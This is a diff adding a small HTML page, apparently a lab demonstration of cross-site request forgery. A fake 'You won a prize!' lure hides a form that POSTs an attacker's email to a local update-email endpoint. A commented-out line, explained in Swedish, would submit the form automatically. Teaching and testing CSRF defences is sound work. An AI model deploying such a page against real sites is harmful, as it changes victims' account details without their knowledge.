@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious Page</title>
+  </head>
+  <body>
+    <h1>You won a prize!</h1>
+    <p>Click the button below to claim your reward!</p>
+    <form
+      id="malicious-form"
+      action="http://localhost:8000/update-email"
+      method="POST"
+    >
+      <input type="hidden" name="username" value="hacker@example.com" />
+      <button type="submit">Claim Reward</button>
+    </form>
+    <script>
+      // Om du kommenterar ut den här kommer sidan att submitta direkt.
+      //document.getElementById("malicious-form").submit();
+    </script>
+  </body>
+</html>
